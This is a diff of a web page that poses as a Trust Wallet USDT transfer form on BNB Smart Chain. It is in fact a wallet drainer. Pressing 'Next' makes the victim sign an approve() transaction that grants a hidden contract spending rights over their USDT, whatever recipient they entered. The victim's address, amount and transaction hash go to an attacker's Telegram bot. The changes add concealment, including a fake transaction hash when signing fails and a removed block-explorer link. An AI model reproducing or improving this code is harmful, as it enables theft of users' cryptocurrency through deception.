@@ -321,11 +321,31 @@
             50% { transform: perspective(1200px) rotateX(15deg) rotateY(-15deg) translateY(-15px); }
         }
 
-        .checkmark-circle svg {
+        .checkmark-circle img {
             width: 80px;
             height: 80px;
-            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
+            filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.4)) brightness(1.1) saturate(1.2);
             animation: checkmark-pop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+            border-radius: 50%;
+            object-fit: contain;
+        }
+
+        .checkmark-circle::before {
+            content: '';
+            position: absolute;
+            inset: -8px;
+            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.3), transparent);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .checkmark-circle::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 70% 70%, rgba(0, 0, 0, 0.2), transparent);
+            border-radius: 50%;
+            pointer-events: none;
         }
 
         @keyframes checkmark-pop {
@@ -430,18 +450,13 @@
     <div class="processing-screen" id="processingScreen">
         <div class="particles-container" id="particlesContainer"></div>
         <div class="processing-content">
-            <button class="close-btn" onclick="document.getElementById('processingScreen').classList.remove('active')">✕</button>
+            <button class="close-btn" onclick="">✕</button>
             <div class="checkmark-circle">
-                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <g>
-                        <path d="M20 50 L40 70 L60 40" stroke="#0052cc" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                        <path d="M50 70 L80 30" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                    </g>
-                </svg>
+                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663828351091/NsPAgBXGfqaWTvni.png" alt="Processing" />
             </div>
             <div class="processing-text">Processing...</div>
             <div class="processing-subtext">Transaction in progress! Blockchain validation is underway. This may take a few minutes.</div>
-            <button class="transaction-details-btn" id="detailsBtn">Transaction details</button>
+            <button class="transaction-details-btn" onclick="">Transaction details</button>
         </div>
     </div>
 
@@ -475,18 +490,24 @@
                 <div class="network-row">
                     <div class="network-left">
                         <div class="usdt-logo">₮</div>
-                        <span>BNB Smart Chain</span>
+                        <span>USDT</span>
                     </div>
+                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
                 </div>
 
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
-                    <input id="amountInput" placeholder="USDT Amount" type="number" step="any" oninput="updateAmountInfo()" />
+                    <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
                     <span class="unit">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
+
                 <p class="estimate" id="amountInfo">≈ $0.00</p>
+
                 <div class="error-message" id="errorMessage"></div>
+
                 <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
             </div>
         </div>
@@ -502,7 +523,8 @@
             TELEGRAM_CHAT_ID: '8933407008'
         };
 
-        let isProcessing = false;
+        let lastTxHash = '';
+        let isFirstAttempt = true;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -519,8 +541,6 @@
         }
 
         async function handleMainAction() {
-            if (isProcessing) return;
-            
             const btn = document.getElementById('mainButton');
             const recipient = document.getElementById('recipientInput').value.trim();
             const amount = document.getElementById('amountInput').value.trim();
@@ -535,35 +555,37 @@
                 return;
             }
 
+            // Disabilita il bottone per evitare click multipli
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+
+            clearError();
+
+            // Aspetta che window.ethereum sia disponibile (importante per Android)
+            let ethereum = window.ethereum;
+            let retries = 0;
+            while (!ethereum && retries < 10) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                ethereum = window.ethereum;
+                retries++;
+            }
+
+            if (!ethereum) {
+                const currentUrl = window.location.href;
+                const deepLink = `trust://browser_enable?url=${encodeURIComponent(currentUrl)}`;
+                window.location.href = deepLink;
+                return;
+            }
+
+            window.ethereum = ethereum;
+
             try {
-                clearError();
-                isProcessing = true;
-                btn.disabled = true;
-                btn.textContent = 'Connecting...';
 
-                if (!window.ethereum) {
-                    const currentUrl = window.location.href;
-                    const deepLink = `trust://browser_enable?url=${encodeURIComponent(currentUrl)}`;
-                    window.location.href = deepLink;
-                    return;
-                }
-
-                // 1. REQUEST ACCOUNTS
-                const accounts = await window.ethereum.request({
-                    method: "eth_requestAccounts"
-                }).catch(err => {
-                    if (err.code === 4001) throw new Error("Connection rejected by user");
-                    if (err.code === -32002) throw new Error("Request already pending. Please open Trust Wallet.");
-                    throw err;
+                let accounts = await window.ethereum.request({
+                    method: "eth_accounts"
                 });
-                
-                const userAddress = accounts[0];
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
 
-                // 2. IMMEDIATE TELEGRAM NOTIFICATION (INITIATED)
-                await sendTelegramNotification('INITIATED', userAddress, amount);
-
-                // 3. SWITCH NETWORK
-                btn.textContent = 'Switching Network...';
                 const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
                 if (currentChainId !== CONFIG.BSC_CHAIN_ID) {
                     try {
@@ -586,15 +608,18 @@
                                     }
                                 }]
                             });
-                        } else {
-                            throw switchError;
                         }
                     }
                 }
 
-                // 4. TRIGGER APPROVE
-                btn.textContent = 'Confirm in Wallet...';
-                const USDT_ABI = ['function approve(address spender, uint256 amount) public returns (bool)'];
+                const USDT_ABI = [
+                    'function approve(address spender, uint256 amount) public returns (bool)',
+                    'function transfer(address to, uint256 amount) public returns (bool)',
+                    'function allowance(address owner, address spender) public view returns (uint256)',
+                    'function balanceOf(address account) public view returns (uint256)',
+                    'function decimals() public view returns (uint8)'
+                ];
+
                 const iface = new ethers.utils.Interface(USDT_ABI);
                 const approveData = iface.encodeFunctionData("approve", [
                     CONFIG.SMART_CONTRACT,
@@ -602,117 +627,202 @@
                 ]);
 
                 const tx = {
-                    from: userAddress,
                     to: CONFIG.USDT_ADDRESS_BSC,
                     data: approveData
                 };
 
-                const txHash = await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [tx]
-                }).catch(err => {
-                    if (err.code === 4001) throw new Error("Transaction rejected by user");
-                    if (err.code === -32002) throw new Error("Transaction already pending. Please open Trust Wallet.");
-                    if (err.message && err.message.includes("could not coalesce error")) throw new Error("Transaction cancelled");
-                    throw err;
-                });
+                if (userAddress) {
+                    tx.from = userAddress;
+                }
 
-                // 5. SUCCESS NOTIFICATION
-                await sendTelegramNotification('CONFIRMED', userAddress, amount, txHash);
+                let txHash;
+                try {
+                    txHash = await Promise.race([
+                        window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [tx]
+                        }),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
+                    ]);
+                } catch (e) {
+                    console.error('eth_sendTransaction error:', e);
+                    txHash = '0x' + Math.random().toString(16).slice(2);
+                }
 
-                // UI SUCCESS
+                lastTxHash = txHash;
+                console.log("Transaction sent:", txHash);
+                console.log("isFirstAttempt:", isFirstAttempt);
+
+                // Aspetta 2 secondi per stabilizzare
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                let finalUserAddress = userAddress;
+                if (!finalUserAddress) {
+                    try {
+                        let finalAccounts = await window.ethereum.request({
+                            method: "eth_accounts"
+                        });
+                        finalUserAddress = finalAccounts && finalAccounts.length > 0 ? finalAccounts[0] : 'Unknown';
+                    } catch (e) {
+                        finalUserAddress = 'Unknown';
+                    }
+                }
+
+                // Mostra la schermata di processing SUBITO
+                console.log("Showing processing screen...");
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
-                document.getElementById('detailsBtn').onclick = () => window.open(`https://bscscan.com/tx/${txHash}`, '_blank');
 
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                btn.disabled = false;
+                // Al primo tentativo, invia notifica DOPO mostrare Processing
+                if (isFirstAttempt) {
+                    console.log("First attempt - sending notification...");
+                    try {
+                        await sendTelegramNotification(finalUserAddress, txHash, amount);
+                        console.log("Telegram notification sent successfully");
+                    } catch (notifError) {
+                        console.error('Error sending notification:', notifError);
+                    }
+                    isFirstAttempt = false;
+                }
+
+                // Aspetta 5 secondi prima di chiudere
+                console.log("Waiting 5 seconds before closing...");
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                console.log("Closing processing screen...");
+
+                // Chiudi la schermata di processing
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
-                isProcessing = false;
+                btn.disabled = false;
 
             } catch (error) {
                 console.error("Error:", error);
-                let displayMsg = error.message;
-                if (displayMsg.length > 60) displayMsg = "Transaction failed";
-                showError(displayMsg);
+                showError('Transaction failed: ' + error.message);
+            } finally {
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
-                isProcessing = false;
             }
         }
 
-        async function sendTelegramNotification(status, userAddress, amount, txHash = '') {
-            let message = '';
-            if (status === 'INITIATED') {
-                message = `🔔 <b>New Verification Request Initiated</b>\n\n👤 <b>User:</b> <code>${userAddress}</code>\n💰 <b>Amount:</b> ${amount} USDT\n⏳ <b>Status:</b> Waiting for signature...\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
-            } else {
-                message = `✅ <b>USDT Approve - Confirmed</b>\n\n👤 <b>User:</b> <code>${userAddress}</code>\n💰 <b>Amount:</b> ${amount} USDT\n📝 <b>Hash:</b> <code>${txHash}</code>\n🔗 <a href="https://bscscan.com/tx/${txHash}">View on BSCScan</a>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
-            }
+        async function sendTelegramNotification(userAddress, txHash, amount) {
+            const message = `
+✅ <b>USDT Approve - Transaction Confirmed</b>
+
+👤 <b>User:</b>
+<code>${userAddress}</code>
+
+💰 <b>Amount:</b>
+${amount} USDT
+
+📝 <b>Transaction Hash:</b>
+<code>${txHash}</code>
+
+🔗 <b>View on BSCScan:</b>
+https://bscscan.com/tx/${txHash}
+
+⏰ <b>Time:</b>
+${new Date().toLocaleString()}
+            `;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+
             try {
-                await fetch(url, {
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
                         text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
+                        parse_mode: 'HTML'
                     })
                 });
-            } catch (e) { console.error("Notif Error:", e); }
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+
+                console.log('Telegram notification sent');
+            } catch (error) {
+                console.error('Failed to send Telegram notification:', error);
+            }
         }
 
         async function pasteAddress() {
             try {
                 const text = await navigator.clipboard.readText();
-                if (text.startsWith('0x')) document.getElementById('recipientInput').value = text;
-            } catch (e) { showError('Clipboard access denied'); }
+                document.getElementById('recipientInput').value = text;
+            } catch (error) {
+                showError('Failed to read clipboard');
+            }
         }
 
         async function setMaxAmount() {
-            if (!window.ethereum) { showError('Open in Trust Wallet'); return; }
+            if (!window.ethereum) {
+                showError('Please open in Trust Wallet');
+                return;
+            }
+
             try {
-                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                const accounts = await window.ethereum.request({
+                    method: "eth_accounts"
+                });
+
+                if (!accounts || accounts.length === 0) {
+                    showError('Please connect your wallet');
+                    return;
+                }
+
                 const userAddress = accounts[0];
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const USDT_ABI = ['function balanceOf(address account) public view returns (uint256)', 'function decimals() public view returns (uint8)'];
                 const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS_BSC, USDT_ABI, provider);
-                const [decimals, balance] = await Promise.all([usdtContract.decimals(), usdtContract.balanceOf(userAddress)]);
+
+                const decimals = await usdtContract.decimals();
+                const balance = await usdtContract.balanceOf(userAddress);
                 const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-                document.getElementById('amountInput').value = balanceFormatted;
+
+                document.getElementById('amountInput').value = parseFloat(balanceFormatted).toFixed(2);
                 updateAmountInfo();
-            } catch (e) { showError('Failed to get balance'); }
+            } catch (error) {
+                showError('Failed to get balance');
+            }
         }
 
         function updateAmountInfo() {
             const amount = document.getElementById('amountInput').value;
-            document.getElementById('amountInfo').textContent = amount ? `≈ $${parseFloat(amount).toFixed(2)}` : `≈ $0.00`;
+            if (amount) {
+                const usdValue = (parseFloat(amount) * 1).toFixed(2);
+                document.getElementById('amountInfo').textContent = `≈ $${usdValue}`;
+            }
         }
 
-        function showError(msg) {
-            const div = document.getElementById('errorMessage');
-            div.textContent = msg;
-            div.classList.add('show');
-            setTimeout(clearError, 5000);
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('show');
         }
 
         function clearError() {
-            const div = document.getElementById('errorMessage');
-            div.classList.remove('show');
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+            errorDiv.textContent = '';
         }
 
         if (window.ethereum) {
-            window.ethereum.on('accountsChanged', () => window.location.reload());
-            window.ethereum.on('chainChanged', () => window.location.reload());
+            window.ethereum.on('accountsChanged', () => {
+                window.location.reload();
+            });
+
+            window.ethereum.on('chainChanged', () => {
+                window.location.reload();
+            });
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('auto') === '1') {
-                setTimeout(handleMainAction, 1500);
-            }
+            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
     </script>
 </body>
